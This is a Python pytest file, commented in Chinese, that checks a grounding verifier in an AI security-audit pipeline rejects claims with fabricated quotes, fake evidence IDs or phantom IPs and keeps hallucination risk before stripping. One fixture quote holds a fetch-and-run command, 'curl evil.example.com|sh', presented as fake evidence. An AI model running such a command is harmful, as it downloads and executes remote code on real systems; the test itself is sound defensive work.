"""
P0-C-1 / C-2 负面测试: 硬性证据条件与加权评分分离；先算原始风险再剥离

C-1 (加权分掩盖证据造假):
    修复前 Layer 2「引用原文 100% 伪造」把 grounding_ratio 打到 0（扣 0.40），
    但其余 0.60 权重的满分项（空引用记 1.0、单事件链完整性记 1.0 …）把总分抬到
    0.5000 → verdict = partially_grounded → 被 strip_ungrounded_claims 放行进投票集。
    实测（单条断言，引用 1 个真实事件 ID）：
        有 ID、无任何 quote        → 0.9000 grounded          放行
        有 ID、quote 100% 伪造      → 0.5000 partially_grounded 放行
        同一真实 quote 重复 20 次   → 0.9000 grounded          放行

C-2 (剥离后重算导致风险塌零):
    修复前 sub_auditor 先 strip_ungrounded_claims 再 validate_evidence，
    分母 total 只剩 admitted → 被整条丢弃的断言从不计入
    → hallucination_risk = 0.0，HALLUCINATION_EARLY_STOP 早停与强制人审几乎永不触发。

验收: 新测试在旧代码下失败，修复后通过。
"""
import asyncio
import datetime as dt
import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

os.environ.setdefault("SHARED_MEMORY_DATABASE_URL", "sqlite+aiosqlite:///:memory:")
os.environ.setdefault("SHARED_MEMORY_JWT_SECRET", "test-secret")
os.environ.setdefault("SHARED_MEMORY_LLM_API_KEY", "test")
os.environ.setdefault("SHARED_MEMORY_EMBEDDING_API_KEY", "test")
os.environ.setdefault("SHARED_MEMORY_ADMIN_PASSWORD", "test")

import sqlalchemy.ext.asyncio as _sa_async

_orig = _sa_async.create_async_engine


def _patched(url, **kw):
    for k in ("pool_size", "max_overflow", "pool_pre_ping", "pool_recycle"):
        kw.pop(k, None)
    return _orig(url, **kw)


_sa_async.create_async_engine = _patched
import models  # noqa: F401

from grounding_verifier import grounding_verifier
from agents.sub_auditor import ChunkVerdict


def _events():
    """一个真实存在的事件块。

    `created_at` 取「现在 - 5 分钟」而非硬编码绝对时间 ——
    整改方案 §四.6 第 6 条：「所有时间窗口测试都固定时间，避免测试受运行
    时间和服务器时区影响」。

    实测（2026-10-19 18:00 北京时间）：`grounding_verifier` 的
    `_EVIDENCE_TTL_SECONDS = 86400`，这里原本硬编码的
    `2026-10-18T10:00:00+00:00` 一过 `2026-10-19T10:00:00Z` 就被判过期
    → `freshness_score` 1.0→0.0 → `grounding_score` 0.5→0.4
    → 下面 C-1 的前提守卫 `grounding_score > 0.4` 失效，用例报「C-1 未修复」
    —— 而被测性质一直成立（`verdict` 仍是 `ungrounded`，
    `hard_fail_reasons` 仍含 `all_quotes_ungrounded`）。

    也就是说它红在**前提守卫**上，不红在被测性质上，而且是条会自己引爆的用例。
    """
    created = (dt.datetime.now(dt.timezone.utc)
               - dt.timedelta(minutes=5)).isoformat()
    return [{
        "id": 1,
        "event_type": "C2_BEACON",
        "severity": "high",
        "src_ip": "10.0.0.5",
        "dst_ip": "203.0.113.9",
        "message": "beacon to 203.0.113.9 every 60s",
        "created_at": created,
    }]


def _verify(claims, events=None):
    return grounding_verifier.verify_chunk(
        claims, events if events is not None else _events(),
        knowledge_chunks=[], chunk_id="c1",
    )


def _claim(**kw):
    base = {
        "type": "C2", "confidence": 0.9,
        "evidence_ids": [1], "evidence_quotes": ["beacon"],
        "severity": "high", "summary": "观察到周期外连 10.0.0.5 -> 203.0.113.9",
    }
    base.update(kw)
    return base


# ═══════════════════════════════════════════
# C-1: 硬性否决
# ═══════════════════════════════════════════

class TestHardFailConditions:
    def test_fully_fabricated_quotes_cannot_pass_via_other_high_layers(self):
        """C-1 核心回归：引用全伪造必须硬否决，不能靠其余维度满分放行。"""
        report = _verify([_claim(evidence_quotes=[
            "attack payload /bin/sh -c curl evil.example.com|sh",
            "attacker exfiltrated 4GB to 198.51.100.7",
        ])])
        r = report.claims[0]
        assert r.grounding_ratio == 0.0, "前置条件：本用例的引用应全部溯源失败"
        assert r.freshness_score == 1.0, (
            f"前置条件不成立：证据已过期（freshness={r.freshness_score}）—— "
            "加权分被 freshness 拉低 0.10，会让本用例在硬否决生效时也"
            "因分数偏低而红，看起来像 C-1 回归。检查 `_events()` 的时间构造")
        assert r.grounding_score > 0.4, (
            f"前置条件不成立：加权分 {r.grounding_score} 低到本来就会被判 ungrounded，"
            "无法证明硬否决的作用"
        )
        assert r.verdict == "ungrounded", (
            f"quote 全伪造却得到 {r.verdict} —— C-1 未修复"
        )
        assert any("all_quotes_ungrounded" in x for x in r.hard_fail_reasons)

    def test_fabricated_evidence_id_is_hard_fail(self):
        report = _verify([_claim(evidence_ids=[999999], evidence_quotes=["beacon"])])
        r = report.claims[0]
        assert r.verdict == "ungrounded"
        assert any("fabricated_evidence_ids" in x for x in r.hard_fail_reasons)

    def test_partial_fake_id_is_hard_fail(self):
        """部分 ID 缺失同样是造假 —— 不得因「大部分对」而放行。"""
        report = _verify([_claim(evidence_ids=[1, 999999], evidence_quotes=["beacon"])])
        r = report.claims[0]
        assert r.verdict == "ungrounded"
        assert any("fabricated_evidence_ids" in x for x in r.hard_fail_reasons)

    def test_phantom_ip_is_hard_fail(self):
        report = _verify([_claim(summary="内网 10.0.0.5 对外发起扫描 8.8.8.8")])
        r = report.claims[0]
        assert r.phantom_ips, "前置条件不成立：summary 中的 IP 不应全部可验证"
        assert r.verdict == "ungrounded"
        assert any("phantom_entities" in x for x in r.hard_fail_reasons)

    def test_hard_fail_claim_is_not_admitted_to_voting(self):
        """硬否决的断言不得进入 strip 后的投票集合。"""
        from veto_gates import strip_ungrounded_claims
        claims = [_claim(evidence_quotes=["完全捏造的 payload 内容 xyzzy"])]
        report = _verify(claims)
        admitted, discarded = strip_ungrounded_claims(
            claims, claim_reports=report.claims
        )
        assert not admitted, "硬否决断言被放进了投票集"
        assert len(discarded) == 1

    def test_legitimate_claim_still_passes(self):
        """正向对照：真实引用不得被硬否决误伤。"""
        report = _verify([_claim()])
        r = report.claims[0]
        assert r.grounding_ratio == 1.0
        assert not r.hard_fail_reasons
        assert r.verdict == "grounded", (
            f"合法断言被误判为 {r.verdict}: {r.hard_fail_reasons}"
        )

    def test_legitimate_claim_admitted_to_voting(self):
        from veto_gates import strip_ungrounded_claims
        claims = [_claim()]
        report = _verify(claims)
        admitted, discarded = strip_ungrounded_claims(
            claims, claim_reports=report.claims
        )
        assert len(admitted) == 1 and not discarded


# ═══════════════════════════════════════════
# C-2: 先算原始风险再剥离
# ═══════════════════════════════════════════

class TestRawRiskBeforeStripping:
    def test_raw_validation_denominator_includes_discarded_claims(self):
        claims = [
            _claim(summary="断言A 无任何引用"),
            _claim(summary="断言B 真实引用", evidence_ids=[1]),
            _claim(summary="断言C ID 不存在", evidence_ids=[999999]),
            _claim(summary="断言D 引用全伪造", evidence_quotes=["捏造内容 plugh"]),
        ]
        v = ChunkVerdict(
            chunk_id="c1", threat_detected=True, threat_claims=claims,
            all_event_ids_in_chunk=[1],
        )
        raw = v.validate_evidence(claims=claims)
        # 分母必须是全部 4 条原始断言
        assert raw["total_claims"] == 4, (
            f"分母应为 4 条原始断言，实际 {raw['total_claims']}"
        )
        assert raw["invalid_claims"] >= 1
        assert raw["hallucination_risk"] > 0.0

    def test_validate_evidence_accepts_explicit_claim_set(self):
        claims = [_claim(summary="A", evidence_ids=[1]),
                  _claim(summary="B", evidence_ids=[999999])]
        v = ChunkVerdict(
            chunk_id="c1", threat_detected=True,
            threat_claims=[claims[0]],          # 模拟"已被剥离成 admitted"
            all_event_ids_in_chunk=[1],
        )
        # 默认口径 = 当前 threat_claims（1 条，全有效）
        assert v.validate_evidence()["invalid_claims"] == 0
        # 显式传入原始集合 → 能看到被剥离那条的问题
        assert v.validate_evidence(claims=claims)["invalid_claims"] == 1

    def test_sub_auditor_keeps_raw_risk_after_stripping(self, monkeypatch):
        """端到端：经过 strip 之后，hallucination_risk 不得回落。"""
        from agents import sub_auditor as sa

        events = _events()
        claims = [
            _claim(summary="真实断言", evidence_ids=[1]),
            _claim(summary="伪造断言", evidence_ids=[999999],
                   evidence_quotes=["凭空捏造的 payload"]),
        ]

        class _FakeGrounding:
            overall_score = 0.55
            grounded_claims = 1
            partially_grounded = 0
            ungrounded_claims = 1
            hallucination_indicators = ["test"]
            claims = []

        class _FakeChunk:
            chunk_id = "c1"
            events = _events()

            def to_prompt_block(self):
                return "<untrusted_log>x</untrusted_log>"

        async def fake_chat(messages, **kw):
            import json
            return json.dumps({
                "threat_detected": True, "confidence": 0.8, "severity": "high",
                "summary": "s", "threat_claims": claims,
            })

        monkeypatch.setattr(sa.sub_auditor, "llm_chat", fake_chat)
        monkeypatch.setattr(
            "grounding_verifier.grounding_verifier.verify_chunk",
            lambda *a, **k: _FakeGrounding(),
        )

        loop = asyncio.new_event_loop()
        try:
            v = loop.run_until_complete(sa.sub_auditor.audit(_FakeChunk()))
        finally:
            loop.close()

        assert v.raw_evidence_validation, "必须保留剥离前的原始有效性快照"
        assert v.raw_evidence_validation["total_claims"] == 2
        assert v.hallucination_risk > 0.0, (
            f"剥离后 hallucination_risk 塌到 {v.hallucination_risk} —— C-2 未修复"
        )
        assert v.unsubstantiated is True


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
